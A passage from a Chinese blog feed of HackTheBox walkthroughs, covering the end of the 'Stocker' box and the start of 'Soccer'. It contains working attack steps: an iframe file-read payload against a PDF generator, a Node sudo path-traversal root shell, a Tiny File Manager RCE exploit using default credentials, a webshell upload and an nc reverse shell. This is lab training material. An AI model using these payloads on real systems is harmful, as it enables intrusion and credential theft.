src="/pic/3e17b113578b61f125cb53dae13e3ae2_MD5.png"></p><p>链接点进去是个 pdf</p><p><img src="/pic/3b5d94552235bff87e4a76228d388c48_MD5.png"></p><p>尝试 burp 抓包，然后修改一些字段试试</p><p><img src="/pic/ae96aed37416c2f9e18c3daa86dbd86a_MD5.png"></p><p>话说既然可以这样修改，岂不是可以零元购（不是</p><p><img src="/pic/4f153cef432e94476d956f51e03553b0_MD5.png"></p><h3 id="Skia-x2F-PDF-漏洞"><a href="#Skia-x2F-PDF-漏洞" class="headerlink" title="Skia&#x2F;PDF 漏洞"></a>Skia&#x2F;PDF 漏洞</h3><p>到这里又没什么思路了，尝试了测试是否存在本地文件包含，无效，代码执行的话，这里只用了字符串，尝试后预期内无效，看了眼 WP，给出的思路是下载下来看这个文件的信息（</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads]<br>└─$ exiftool document.pdf                           <br>ExifTool Version Number         : 12.57<br>File Name                       : document.pdf<br>Directory                       : .<br>File Size                       : 42 kB<br>File Modification Date/Time     : 2023:06:07 22:47:24-04:00<br>File Access Date/Time           : 2023:06:07 22:48:00-04:00<br>File Inode Change Date/Time     : 2023:06:07 22:47:41-04:00<br>File Permissions                : -rw-r--r--<br>File Type                       : PDF<br>File Type Extension             : pdf<br>MIME Type                       : application/pdf<br>PDF Version                     : 1.4<br>Linearized                      : No<br>Page Count                      : 1<br>Tagged PDF                      : Yes<br>Creator                         : Chromium<br>Producer                        : Skia/PDF m108<br>Create Date                     : 2023:06:08 02:43:35+00:00<br>Modify Date                     : 2023:06:08 02:43:35+00:00<br>                                                                                                                                                                                                                                           <br>┌──(kali㉿kali)-[~/Downloads]<br>└─$ binwalk document.pdf <br><br>DECIMAL       HEXADECIMAL     DESCRIPTION<br>--------------------------------------------------------------------------------<br>0             0x0             PDF document, version: <span class="hljs-string">&quot;1.4&quot;</span><br>390           0x186           Zlib compressed data, default compression<br>10980         0x2AE4          Zlib compressed data, default compression<br>26950         0x6946          Zlib compressed data, default compression<br>27517         0x6B7D          Zlib compressed data, default compression<br>39333         0x99A5          Zlib compressed data, default compression<br></code></pre></td></tr></table></figure><p>需要特别关注的是，这里给出了 <code>Producer</code>，搜一搜存不存在漏洞利用</p><p><img src="/pic/de204622d6768076d927308b94cd05c7_MD5.png"></p><p><img src="/pic/af9287775bfba1397eb9213f99f27881_MD5.png"></p><p>尝试构造一下 payload：<code>&quot;title&quot;:&quot;&lt;iframe src=file:///etc/passwd width=800 height=1050 &gt; &quot;,</code> 这里高和宽的选择是要经过慢慢测试的，当 height 过高时无法显示，太低了就显示不全文件</p><p><img src="/pic/df9b61b8b9b84ebf441ed2214a4ff582_MD5.png"></p><p>angoose 用户有 bash 权限</p><p><img src="/pic/647cf3ef72d0834d2beada8c9a700ecd_MD5.png"></p><h3 id="配置文件读取"><a href="#配置文件读取" class="headerlink" title="配置文件读取"></a>配置文件读取</h3><p>尝试读取 shadow 文件，不出所料读取不了，那就只能考虑读取一些配置文件了，nginx 的配置文件经过搜索发现位于&#x2F;etc&#x2F;nginx&#x2F;nginx.conf</p><p><img src="/pic/dea4724789b75966f05069675506e46c_MD5.png"></p><p>也只得到了一个所在路径，尝试得到报错信息</p><p><img src="/pic/fab4a92874cfbe7e1ee64428acb60e93_MD5.png"></p><p>尝试读取上述路径文件，但是没什么信息，继续看 WP，目标文件原来在&#x2F;var&#x2F; www&#x2F;dev路径下 ，名字是 index.js</p><p><img src="/pic/2c047f2d315255d204b741c25fb9eed1_MD5.png"></p><p>有一串特殊的字符串，给出了 dev 用户的密码 <code>dev:IHeardPassphrasesArePrettySecure</code>，尝试是否可以通过这个密码进行 ssh 登录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(i3eg1nner㉿minilite)-[~]<br>└─$ ssh angoose@10.10.11.196<br>The authenticity of host <span class="hljs-string">&#x27;10.10.11.196 (10.10.11.196)&#x27;</span> can<span class="hljs-string">&#x27;t be established.</span><br><span class="hljs-string">ED25519 key fingerprint is SHA256:jqYjSiavS/WjCMCrDzjEo7AcpCFS07X3OLtbGHo/7LQ.</span><br><span class="hljs-string">This key is not known by any other names.</span><br><span class="hljs-string">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</span><br><span class="hljs-string">Warning: Permanently added &#x27;</span>10.10.11.196<span class="hljs-string">&#x27; (ED25519) to the list of known hosts.</span><br><span class="hljs-string">angoose@10.10.11.196&#x27;</span>s password:<br>Last login: Wed Jun  7 12:32:14 2023 from 10.10.16.30<br>angoose@stocker:~$ <span class="hljs-built_in">pwd</span><br>/home/angoose<br>angoose@stocker:~$ <span class="hljs-built_in">ls</span><br>user.txt<br>angoose@stocker:~$ <span class="hljs-built_in">cat</span> user.txt<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs bash">angoose@stocker:~$ sudo -l<br>[sudo] password <span class="hljs-keyword">for</span> angoose:<br>Matching Defaults entries <span class="hljs-keyword">for</span> angoose on stocker:<br>    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin<br><br>User angoose may run the following commands on stocker:<br>    (ALL) /usr/bin/node /usr/local/scripts/*.js<br>angoose@stocker:~$ <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;require(&quot;</span>child_process<span class="hljs-string">&quot;).spawn(&quot;</span>/bin/sh<span class="hljs-string">&quot;, &#123;stdio: [0, 1, 2]&#125;)&quot;</span> &gt; /usr/local/scripts/shell.js<br>-bash: /usr/local/scripts/shell.js: Permission denied<br>angoose@stocker:~$ <span class="hljs-built_in">ls</span> -liah /usr/local/scripts/<br>total 32K<br>64592 drwxr-xr-x  3 root root 4.0K Dec  6  2022 .<br>56194 drwxr-xr-x 11 root root 4.0K Dec  6  2022 ..<br>64593 -rwxr-x--x  1 root root  245 Dec  6  2022 creds.js<br>64594 -rwxr-x--x  1 root root 1.6K Dec  6  2022 findAllOrders.js<br>64595 -rwxr-x--x  1 root root  793 Dec  6  2022 findUnshippedOrders.js<br>64598 drwxr-xr-x  2 root root 4.0K Dec  6  2022 node_modules<br>64596 -rwxr-x--x  1 root root 1.4K Dec  6  2022 profitThisMonth.js<br>64597 -rwxr-x--x  1 root root  623 Dec  6  2022 schema.js<br>angoose@stocker:~$ <span class="hljs-built_in">touch</span> shell.js<br>angoose@stocker:~$ <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;require(&quot;</span>child_process<span class="hljs-string">&quot;).spawn(&quot;</span>/bin/sh<span class="hljs-string">&quot;, &#123;stdio: [0, 1, 2]&#125;)&quot;</span> &gt; /usr/local/scripts/shell.js<br>-bash: /usr/local/scripts/shell.js: Permission denied<br></code></pre></td></tr></table></figure><h2 id="node-提权"><a href="#node-提权" class="headerlink" title="node 提权"></a>node 提权</h2><p>这次的提权比较简单，<code>sudo -l</code> 给出了明显的线索，可以使用 node 命令执行 js 文件，尝试在那个目录下写入文件，失败。应该是没有权限，不过感觉可以通过 <code>../</code> 来绕过</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs bash">angoose@stocker:~$ <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;require(&quot;</span>child_process<span class="hljs-string">&quot;).spawn(&quot;</span>/bin/sh<span class="hljs-string">&quot;, &#123;stdio: [0, 1, 2]&#125;)&quot;</span> &gt; shell.js<br>angoose@stocker:~$ sudo /usr/bin/node /usr/local/scripts/../../../../home/angoose/shell.js<br>/home/angoose/shell.js:1<br>require(child_process).spawn(/bin/sh, &#123;stdio: [0, 1, 2]&#125;)<br>                             ^<br><br>SyntaxError: Invalid regular expression flags<br>    at Object.compileFunction (node:vm:360:18)<br>    at wrapSafe (node:internal/modules/cjs/loader:1088:15)<br>    at Module._compile (node:internal/modules/cjs/loader:1123:27)<br>    at Module._extensions..js (node:internal/modules/cjs/loader:1213:10)<br>    at Module.load (node:internal/modules/cjs/loader:1037:32)<br>    at Module._load (node:internal/modules/cjs/loader:878:12)<br>    at Function.executeUserEntryPoint [as runMain] (node:internal/modules/run_main:81:12)<br>    at node:internal/main/run_main_module:23:47<br><br>Node.js v18.12.1<br>angoose@stocker:~$ <span class="hljs-built_in">whoami</span><br>angoose<br>angoose@stocker:~$ <span class="hljs-built_in">id</span><br>uid=1001(angoose) gid=1001(angoose) <span class="hljs-built_in">groups</span>=1001(angoose)<br>angoose@stocker:~$ <span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;require(&quot;child_process&quot;).spawn(&quot;/bin/sh&quot;, &#123;stdio: [0, 1, 2]&#125;)&#x27;</span> &gt; shell.js<br>angoose@stocker:~$ <span class="hljs-built_in">cat</span> shell.js<br>require(<span class="hljs-string">&quot;child_process&quot;</span>).spawn(<span class="hljs-string">&quot;/bin/sh&quot;</span>, &#123;stdio: [0, 1, 2]&#125;)<br>angoose@stocker:~$ sudo /usr/bin/node /usr/local/scripts/../../../../home/angoose/shell.js<br><span class="hljs-comment"># id</span><br>uid=0(root) gid=0(root) <span class="hljs-built_in">groups</span>=0(root)<br><span class="hljs-comment"># whoami</span><br>root<br><span class="hljs-comment"># cat /root/root.txt</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>knowledge_database</category>
      
      <category>hackthebox</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Soccer靶机</title>
    <link href="/2023/06/3f1f96829489.html"/>
    <url>/2023/06/3f1f96829489.html</url>
    
    <content type="html"><![CDATA[<h1 id="Soccer-靶机"><a href="#Soccer-靶机" class="headerlink" title="Soccer 靶机"></a>Soccer 靶机</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(i3eg1nner㉿minilite)-[~/Downloads/Soccer]<br>└─$ sudo nmap --min-rate 10000 -p- 10.10.11.194<br>Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-06 09:22 EDT<br>Warning: 10.10.11.194 giving up on port because retransmission <span class="hljs-built_in">cap</span> hit (10).<br>Nmap scan report <span class="hljs-keyword">for</span> 10.10.11.194<br>Host is up (0.058s latency).<br>Not shown: 64759 closed tcp ports (reset), 773 filtered tcp ports (no-response)<br>PORT     STATE SERVICE<br>22/tcp   open  ssh<br>80/tcp   open  http<br>9091/tcp open  xmltec-xmlmail<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 28.92 seconds<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(i3eg1nner㉿minilite)-[~/Downloads/Soccer]<br>└─$ sudo nmap -sT -sV -sC -p22,80,9091  10.10.11.194<br>Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-06 09:24 EDT<br>Nmap scan report <span class="hljs-keyword">for</span> 10.10.11.194<br>Host is up (0.0038s latency).<br><br>PORT     STATE SERVICE         VERSION<br>22/tcp   open  ssh             OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)<br>| ssh-hostkey:<br>|   3072 ad0d84a3fdcc98a478fef94915dae16d (RSA)<br>|   256 dfd6a39f68269dfc7c6a0c29e961f00c (ECDSA)<br>|_  256 5797565def793c2fcbdb35fff17c615c (ED25519)<br>80/tcp   open  http            nginx 1.18.0 (Ubuntu)<br>|_http-server-header: nginx/1.18.0 (Ubuntu)<br>|_http-title: Did not follow redirect to http://soccer.htb/<br>9091/tcp open  xmltec-xmlmail?<br>| fingerprint-strings:<br>|   DNSStatusRequestTCP, DNSVersionBindReqTCP, Help, RPCCheck, SSLSessionReq, drda, informix:<br>|     HTTP/1.1 400 Bad Request<br>|     Connection: close<br>|   GetRequest:<br>|     HTTP/1.1 404 Not Found<br>|     Content-Security-Policy: default-src <span class="hljs-string">&#x27;none&#x27;</span><br>|     X-Content-Type-Options: nosniff<br>|     Content-Type: text/html; charset=utf-8<br>|     Content-Length: 139<br>|     Date: Tue, 06 Jun 2023 13:24:56 GMT<br>|     Connection: close<br>|     &lt;!DOCTYPE html&gt;<br>|     &lt;html lang=<span class="hljs-string">&quot;en&quot;</span>&gt;<br>|     &lt;<span class="hljs-built_in">head</span>&gt;<br>|     &lt;meta charset=<span class="hljs-string">&quot;utf-8&quot;</span>&gt;<br>|     &lt;title&gt;Error&lt;/title&gt;<br>|     &lt;/head&gt;<br>|     &lt;body&gt;<br>|     &lt;pre&gt;Cannot GET /&lt;/pre&gt;<br>|     &lt;/body&gt;<br>|     &lt;/html&gt;<br>|   HTTPOptions, RTSPRequest:<br>|     HTTP/1.1 404 Not Found<br>|     Content-Security-Policy: default-src <span class="hljs-string">&#x27;none&#x27;</span><br>|     X-Content-Type-Options: nosniff<br>|     Content-Type: text/html; charset=utf-8<br>|     Content-Length: 143<br>|     Date: Tue, 06 Jun 2023 13:24:56 GMT<br>|     Connection: close<br>|     &lt;!DOCTYPE html&gt;<br>|     &lt;html lang=<span class="hljs-string">&quot;en&quot;</span>&gt;<br>|     &lt;<span class="hljs-built_in">head</span>&gt;<br>|     &lt;meta charset=<span class="hljs-string">&quot;utf-8&quot;</span>&gt;<br>|     &lt;title&gt;Error&lt;/title&gt;<br>|     &lt;/head&gt;<br>|     &lt;body&gt;<br>|     &lt;pre&gt;Cannot OPTIONS /&lt;/pre&gt;<br>|     &lt;/body&gt;<br>|_    &lt;/html&gt;<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br><br>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 12.61 seconds<br><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(i3eg1nner㉿minilite)-[~/Downloads/Soccer]<br>└─$ sudo nmap --script=vuln -p22,80,9091 10.10.11.194<br>[sudo] password <span class="hljs-keyword">for</span> i3eg1nner:<br>Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-06 09:49 EDT<br>Nmap scan report <span class="hljs-keyword">for</span> soccer.htb (10.10.11.194)<br>Host is up (0.0039s latency).<br><br>PORT     STATE SERVICE<br>22/tcp   open  ssh<br>80/tcp   open  http<br>|_http-stored-xss: Couldn<span class="hljs-string">&#x27;t find any stored XSS vulnerabilities.</span><br><span class="hljs-string">|_http-dombased-xss: Couldn&#x27;</span>t find any DOM based XSS.<br>| http-vuln-cve2011-3192:<br>|   VULNERABLE:<br>|   Apache byterange filter DoS<br>|     State: VULNERABLE<br>|     IDs:  BID:49303  CVE:CVE-2011-3192<br>|       The Apache web server is vulnerable to a denial of service attack when numerous<br>|       overlapping byte ranges are requested.<br>|     Disclosure <span class="hljs-built_in">date</span>: 2011-08-19<br>|     References:<br>|       https://seclists.org/fulldisclosure/2011/Aug/175<br>|       https://www.securityfocus.com/bid/49303<br>|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-3192<br>|_      https://www.tenable.com/plugins/nessus/55976<br>|_http-csrf: Couldn<span class="hljs-string">&#x27;t find any CSRF vulnerabilities.</span><br><span class="hljs-string">9091/tcp open  xmltec-xmlmail</span><br><span class="hljs-string"></span><br><span class="hljs-string">Nmap done: 1 IP address (1 host up) scanned in 76.65 seconds</span><br></code></pre></td></tr></table></figure><p>整理一下现在得到的信息：三个开放的端口，大概率 Linux 操作系统，没有明显的漏洞</p><h2 id="Web-界面访问"><a href="#Web-界面访问" class="headerlink" title="Web 界面访问"></a>Web 界面访问</h2><p>访问的时候自动跳转到一个网址 <code>soccer.htb</code>，那我们就在&#x2F;etc&#x2F;hosts 文件中建立映射，这样就能正常访问界面了，查看网页源代码+随意点点点+基础的信息收集，都没得到什么信息。目录爆破吧</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(i3eg1nner㉿minilite)-[~/Downloads/Soccer]<br>└─$ sudo gobuster <span class="hljs-built_in">dir</span> -u http://soccer.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt<br>===============================================================<br>Gobuster v3.5<br>by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)<br>===============================================================<br>[+] Url:                     http://soccer.htb<br>[+] Method:                  GET<br>[+] Threads:                 10<br>[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt<br>[+] Negative Status codes:   404<br>[+] User Agent:              gobuster/3.5<br>[+] Timeout:                 10s<br>===============================================================<br>2023/06/06 09:55:03 Starting gobuster <span class="hljs-keyword">in</span> directory enumeration mode<br>===============================================================<br>/tiny                 (Status: 301) [Size: 178] [--&gt; http://soccer.htb/tiny/]<br>Progress: 219896 / 220561 (99.70%)<br>===============================================================<br>2023/06/06 09:56:35 Finished<br>===============================================================<br></code></pre></td></tr></table></figure><h2 id="Tiny-File-Manager-2-4-3-漏洞"><a href="#Tiny-File-Manager-2-4-3-漏洞" class="headerlink" title="Tiny File Manager 2.4.3 漏洞"></a>Tiny File Manager 2.4.3 漏洞</h2><p>访问一下，是一个叫做 tiny file manager 的文件管理系统，查看网页源代码的时候看到了版本号 <code>2.4.3</code>，谷歌一下</p><p><img src="/pic/e3dd28b2f4b32c6bdd797566236e985d_MD5.png"></p><p>GitHub 中得到了两个脚本，sh 脚本跑的时候出了问题，python 脚本能运行但是没有达到预期的效果（网站限制了写权限的问题）。值得注意的是，使用说明中提到了需要管理员的账户和密码，给的例子里的账户名和密码是默认用户和密码，尝试之后发现确实是默认密码登录。使用脚本跑的时候有如下报错：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(i3eg1nner㉿minilite)-[~/Downloads/Soccer]<br>└─$ python tiny_file_manager_exploit.py  http://soccer.htb/tiny/tinyfilemanager.php admin <span class="hljs-string">&quot;admin@123&quot;</span><br><br><br>CVE-2021-45010: Tiny File Manager &lt;= 2.4.3 Authenticated RCE  Exploit.<br><br>Vulnerability discovered by Febin<br><br>Exploit Author: FEBIN<br><br>[+] Leak <span class="hljs-keyword">in</span> the webroot direcory path to upload shell.<br>[+] WEBROOT found:  /var/www/html/tiny<br>[+] Trying to upload pwn_1480535420723339776.php to /var/www/html/tiny directory...<br>&#123;<span class="hljs-string">&quot;status&quot;</span>:<span class="hljs-string">&quot;error&quot;</span>,<span class="hljs-string">&quot;info&quot;</span>:<span class="hljs-string">&quot;The specified folder for upload isn&#x27;t writeable.&quot;</span>&#125;<br>[-] No Success response. Files does not seem to be uploaded successfully.<br>Exiting...<br>Exited.<br><br></code></pre></td></tr></table></figure><p>观察地址结构似乎没什么问题，看了脚本里上传文件的内容是一句话木马，那就手动上传试试吧，上传提示 tiny 目录没有上传权限，那就试试下一级 upload 目录，上传成功</p><p><img src="/pic/492d3904bfa8b4d484a896efc6e798ee_MD5.png"></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span>soccer.htb<span class="hljs-regexp">/tiny/u</span>ploads/&lt;your-shell-name&gt;<br></code></pre></td></tr></table></figure><h2 id="Getshell"><a href="#Getshell" class="headerlink" title="Getshell"></a>Getshell</h2><p>提前开启监听端口，访问以上路径，即可反弹 shell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(i3eg1nner㉿minilite)-[~/Downloads/Soccer]<br>└─$ sudo nc -lvnp 1234<br>[sudo] password <span class="hljs-keyword">for</span> i3eg1nner:<br>listening on [any] 1234 ...<br>connect to [10.10.14.145] from (UNKNOWN) [10.10.11.194] 34534<br>Linux soccer 5.4.0-135-generic <span class="hljs-comment">#152-Ubuntu SMP Wed Nov 23 20:19:22 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux</span><br> 15:41:04 up  4:06,  0 <span class="hljs-built_in">users</span>,  load average: 0.00, 0.02, 0.00<br>USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT<br>uid=33(www-data) gid=33(www-data) <span class="hljs-built_in">groups</span>=33(www-data)<br>/bin/sh: 0: can\<span class="hljs-string">&#x27;t access tty; job control turned off</span><br><span class="hljs-string">$ whoami</span><br><span class="hljs-string">www-data</span><br><span class="hljs-string">$ uname -a</span><br><span class="hljs-string">Linux soccer 5.4.0-135-generic #152-Ubuntu SMP Wed Nov 23 20:19:22 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux</span><br><span class="hljs-string">$ ip a</span><br><span class="hljs-string">1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000</span><br><span class="hljs-string">    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00</span><br><span class="hljs-string">    inet 127.0.0.1/8 scope host lo</span><br><span class="hljs-string">       valid_lft forever preferred_lft forever</span><br><span class="hljs-string">    inet6 ::1/128 scope host</span><br><span class="hljs-string">       valid_lft forever preferred_lft forever</span><br><span class="hljs-string">2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc mq state UP group default qlen 1000</span><br><span class="hljs-string">    link/ether 00:50:56:b9:5e:b1 brd ff:ff:ff:ff:ff:ff</span><br><span class="hljs-string">    inet 10.10.11.194/23 brd 10.10.11.255 scope global eth0</span><br><span class="hljs-string">       valid_lft forever preferred_lft forever</span><br><span class="hljs-string">    inet6 fe80::250:56ff:feb9:5eb1/64 scope link</span><br><span class="hljs-string">       valid_lft forever preferred_lft forever</span><br><span class="hljs-string">$ which python</span><br><span class="hljs-string">$ which python2</span><br><span class="hljs-string">$ which python3</span><br><span class="hljs-string">/usr/bin/python3</span><br><span class="hljs-string">$ python3 -c &quot;import pty;pty.spawn(&#x27;</span>/bin/bash<span class="hljs-string">&#x27;)&quot;</span><br><span class="hljs-string">www-data@soccer:/$ sudo -l</span><br><span class="hljs-string">sudo -l</span><br><span class="hljs-string">[sudo] password for www-data:</span><br><span class="hljs-string"></span><br><span class="hljs-string">Sorry, try again.</span><br><span class="hljs-string">[sudo] password for www-data: admin@123</span><br><span class="hljs-string"></span><br><span class="hljs-string">Sorry, try again.</span><br><span class="hljs-string">[sudo] password for www-data: 12345</span><br><span class="hljs-string"></span><br><span class="hljs-string">sudo: 3 incorrect password attempts</span><br></code></pre></td></tr></table></figure><p>进行信息收集，在&#x2F;home&#x2F;player 目录下发现了 user.txt 但是没有访问权限，定时任务、用户目录、环境变量，ps中都没有可以利用的点，s 权限中发现一个特殊文件doas</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span 